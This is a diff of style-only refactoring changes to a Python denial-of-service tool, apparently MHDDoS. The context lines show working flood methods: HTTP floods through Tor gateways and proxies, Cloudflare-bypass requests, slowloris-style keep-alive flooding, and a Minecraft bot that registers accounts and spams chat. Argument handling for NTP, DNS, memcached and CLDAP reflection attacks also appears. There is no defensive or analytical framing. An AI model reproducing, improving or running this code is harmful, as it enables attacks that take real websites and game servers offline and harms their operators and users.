@@ -170,32 +170,28 @@ class Tools:
 
     @staticmethod
     def humanbytes(i: int, binary: bool = False, precision: int = 2):
+        if i <= 0:
+            return "-- B"
+        base = 1024 if binary else 1000
+        multiple = trunc(log2(i) / log2(base))
+        value = i / pow(base, multiple)
         MULTIPLES = [
             "B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"
         ]
-        if i > 0:
-            base = 1024 if binary else 1000
-            multiple = trunc(log2(i) / log2(base))
-            value = i / pow(base, multiple)
-            suffix = MULTIPLES[multiple].format("i" if binary else "")
-            return f"{value:.{precision}f} {suffix}"
-        else:
-            return "-- B"
+        suffix = MULTIPLES[multiple].format("i" if binary else "")
+        return f"{value:.{precision}f} {suffix}"
 
     @staticmethod
     def humanformat(num: int, precision: int = 2):
-        suffixes = ['', 'k', 'm', 'g', 't', 'p']
-        if num > 999:
-            obje = sum(
-                [abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes))])
-            return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
-        else:
+        if num <= 999:
             return num
+        suffixes = ['', 'k', 'm', 'g', 't', 'p']
+        obje = sum(abs(num / 1000.0 ** x) >= 1 for x in range(1, len(suffixes)))
+        return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
 
     @staticmethod
     def sizeOfRequest(res: Response) -> int:
-        size: int = len(res.request.method)
-        size += len(res.request.url)
+        size: int = len(res.request.method) + len(res.request.url)
         size += len('\r\n'.join(f'{key}: {value}'
                                 for key, value in res.request.headers.items()))
         return size
@@ -499,7 +495,7 @@ class Layer4(Thread):
     def MCBOT(self) -> None:
         s = None
 
-        with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
+        with (suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s):
             Tools.send(s, Minecraft.handshake_forwarded(self._target,
                                                         self.protocolid,
                                                         2,
@@ -508,11 +504,16 @@ class Layer4(Thread):
             username = f"{con['MCBOT']}{ProxyTools.Random.rand_str(5)}"
             password = b64encode(username.encode()).decode()[:8].title()
             Tools.send(s, Minecraft.login(self.protocolid, username))
-            
+
             sleep(1.5)
 
-            Tools.send(s, Minecraft.chat(self.protocolid, "/register %s %s" % (password, password)))
-            Tools.send(s, Minecraft.chat(self.protocolid, "/login %s" % password))
+            Tools.send(
+                s,
+                Minecraft.chat(
+                    self.protocolid, f"/register {password} {password}"
+                ),
+            )
+            Tools.send(s, Minecraft.chat(self.protocolid, f"/login {password}"))
 
             while Tools.send(s, Minecraft.chat(self.protocolid, str(ProxyTools.Random.rand_str(256)))):
                 sleep(1.1)
@@ -847,14 +848,13 @@ class HttpFlood(Thread):
         Tools.safe_close(s)
 
     def TOR(self) -> None:
-        provider = "." + randchoice(tor2webs)
+        provider = f".{randchoice(tor2webs)}"
         target = self._target.authority.replace(".onion", provider)
-        payload: Any = str.encode(self._payload +
-                                  f"Host: {target}\r\n" +
-                                  self.randHeadercontent +
-                                  "\r\n")
-        s = None
+        payload: Any = str.encode(
+            f"{self._payload}Host: {target}\r\n{self.randHeadercontent}" + "\r\n"
+        )
         target = self._target.host.replace(".onion", provider), self._raw_target[1]
+        s = None
         with suppress(Exception), self.open_connection(target) as s:
             for _ in range(self._rpc):
                 Tools.send(s, payload)
@@ -980,9 +980,7 @@ class HttpFlood(Thread):
 
     def CFB(self):
         global REQUESTS_SENT, BYTES_SEND
-        pro = None
-        if self._proxies:
-            pro = randchoice(self._proxies)
+        pro = randchoice(self._proxies) if self._proxies else None
         s = None
         with suppress(Exception), create_scraper() as s:
             for _ in range(self._rpc):
@@ -1072,9 +1070,7 @@ class HttpFlood(Thread):
 
     def BYPASS(self):
         global REQUESTS_SENT, BYTES_SEND
-        pro = None
-        if self._proxies:
-            pro = randchoice(self._proxies)
+        pro = randchoice(self._proxies) if self._proxies else None
         s = None
         with suppress(Exception), Session() as s:
             for _ in range(self._rpc):
@@ -1218,11 +1214,11 @@ class HttpFlood(Thread):
     def SLOW(self):
         payload: bytes = self.generate_payload()
         s = None
-        with suppress(Exception), self.open_connection() as s:
+        with (suppress(Exception), self.open_connection() as s):
             for _ in range(self._rpc):
                 Tools.send(s, payload)
             while Tools.send(s, payload) and s.recv(1):
-                for i in range(self._rpc):
+                for _ in range(self._rpc):
                     keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
                     Tools.send(s, keep)
                     sleep(self._rpc / 15)
@@ -1288,7 +1284,7 @@ class ToolsConsole:
         cons = f"{gethostname()}@MHTools:~#"
 
         while 1:
-            cmd = input(cons + " ").strip()
+            cmd = input(f"{cons} ").strip()
             if not cmd: continue
             if " " in cmd:
                 cmd, args = cmd.split(" ", 1)
@@ -1323,20 +1319,31 @@ class ToolsConsole:
                         t = [(last - now) for now, last in zip(od, ld)]
 
                         logger.info(
-                            ("Bytes Sent %s\n"
-                             "Bytes Received %s\n"
-                             "Packets Sent %s\n"
-                             "Packets Received %s\n"
-                             "ErrIn %s\n"
-                             "ErrOut %s\n"
-                             "DropIn %s\n"
-                             "DropOut %s\n"
-                             "Cpu Usage %s\n"
-                             "Memory %s\n") %
-                            (Tools.humanbytes(t[0]), Tools.humanbytes(t[1]),
-                             Tools.humanformat(t[2]), Tools.humanformat(t[3]),
-                             t[4], t[5], t[6], t[7], str(cpu_percent()) + "%",
-                             str(virtual_memory().percent) + "%"))
+                            (
+                                "Bytes Sent %s\n"
+                                "Bytes Received %s\n"
+                                "Packets Sent %s\n"
+                                "Packets Received %s\n"
+                                "ErrIn %s\n"
+                                "ErrOut %s\n"
+                                "DropIn %s\n"
+                                "DropOut %s\n"
+                                "Cpu Usage %s\n"
+                                "Memory %s\n"
+                                % (
+                                    Tools.humanbytes(t[0]),
+                                    Tools.humanbytes(t[1]),
+                                    Tools.humanformat(t[2]),
+                                    Tools.humanformat(t[3]),
+                                    t[4],
+                                    t[5],
+                                    t[6],
+                                    t[7],
+                                    f"{str(cpu_percent())}%",
+                                    f"{str(virtual_memory().percent)}%",
+                                )
+                            )
+                        )
             if cmd in ["CFIP", "DNS"]:
                 print("Soon")
                 continue
@@ -1529,9 +1536,7 @@ def handleProxyList(con, proxy_li, proxy_ty, url=None):
                     "Proxy Check failed, Your network may be the problem"
                     " | The target may not be available."
                 )
-            stringBuilder = ""
-            for proxy in Proxies:
-                stringBuilder += (proxy.__str__() + "\n")
+            stringBuilder = "".join((proxy.__str__() + "\n") for proxy in Proxies)
             wr.write(stringBuilder)
 
     proxies = ProxyUtiles.readFromFile(proxy_li)
@@ -1566,11 +1571,10 @@ if __name__ == '__main__':
             target = None
             urlraw = argv[2].strip()
             if not urlraw.startswith("http"):
-                urlraw = "http://" + urlraw
+                urlraw = f"http://{urlraw}"
 
             if method not in Methods.ALL_METHODS:
-                exit("Method Not Found %s" %
-                     ", ".join(Methods.ALL_METHODS))
+                exit(f'Method Not Found {", ".join(Methods.ALL_METHODS)}')
 
             if method in Methods.LAYER7_METHODS:
                 url = URL(urlraw)
@@ -1610,10 +1614,8 @@ if __name__ == '__main__':
                 if not referers_li.exists():
                     exit("The Referer file doesn't exist ")
 
-                uagents = set(a.strip()
-                              for a in useragent_li.open("r+").readlines())
-                referers = set(a.strip()
-                               for a in referers_li.open("r+").readlines())
+                uagents = {a.strip() for a in useragent_li.open("r+").readlines()}
+                referers = {a.strip() for a in referers_li.open("r+").readlines()}
 
                 if not uagents: exit("Empty Useragent File ")
                 if not referers: exit("Empty Referer File ")
@@ -1664,16 +1666,14 @@ if __name__ == '__main__':
                     __ip__ = __ip__
 
                 if len(argv) >= 6:
-                    argfive = argv[5].strip()
-                    if argfive:
+                    if argfive := argv[5].strip():
                         refl_li = Path(__dir__ / "files" / argfive)
                         if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD"}:
                             if not refl_li.exists():
                                 exit("The reflector file doesn't exist")
                             if len(argv) == 7:
                                 logger.setLevel("DEBUG")
-                            ref = set(a.strip()
-                                      for a in Tools.IP.findall(refl_li.open("r").read()))
+                            ref = {a.strip() for a in Tools.IP.findall(refl_li.open("r").read())}
                             if not ref: exit("Empty Reflector File ")
 
                         elif argfive.isdigit() and len(argv) >= 7:
@@ -1687,9 +1687,9 @@ if __name__ == '__main__':
 
                         else:
                             logger.setLevel("DEBUG")
-                
+
                 protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
-                
+
                 if method == "MCBOT":
                     with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
                         Tools.send(s, Minecraft.handshake((target, port), protocolid, 1))
@@ -1697,7 +1697,7 @@ if __name__ == '__main__':
 
                         protocolid = Tools.protocolRex.search(str(s.recv(1024)))
                         protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"] if not protocolid else int(protocolid.group(1))
-                        
+
                         if 47 < protocolid > 758:
                             protocolid = con["MINECRAFT_DEFAULT_PROTOCOL"]
 
